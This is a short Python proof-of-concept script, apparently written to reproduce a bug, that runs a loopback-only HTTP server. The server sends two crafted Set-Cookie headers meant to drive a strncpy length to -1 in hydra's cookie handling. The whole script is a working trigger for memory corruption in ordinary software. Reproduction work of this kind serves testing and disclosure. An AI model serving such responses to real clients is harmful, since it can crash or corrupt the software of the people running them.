#!/usr/bin/env python3
"""Loopback-only malicious HTTP server for the hydra cookie repro.

Serves a fixed 200 response with two Set-Cookie headers. The first has
three spaces after the colon (two leading spaces in the parsed value),
the second has two (one leading space), so the repeated name matches at
cookie[1] and the vulnerable strncpy length becomes -1.
"""
import socket
import sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18080
MODE = sys.argv[2] if len(sys.argv) > 2 else "attack"
COOKIES = (
    b"Set-Cookie:   aaa=1\r\nSet-Cookie:  aaa=2\r\n"
    if MODE == "attack"
    else b"Set-Cookie: aaa=1\r\n"
)
BODY = b"FAIL"
RESPONSE = (
    b"HTTP/1.1 200 OK\r\n" + COOKIES +
    b"Content-Type: text/html\r\n"
    b"Content-Length: " + str(len(BODY)).encode() + b"\r\n"
    b"Connection: close\r\n"
    b"\r\n" + BODY
)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", PORT))
srv.listen(8)
print(f"LISTENING 127.0.0.1:{PORT}", flush=True)
while True:
    conn, addr = srv.accept()
    with conn:
        try:
            conn.recv(16384)
            conn.sendall(RESPONSE)
        except OSError:
            pass
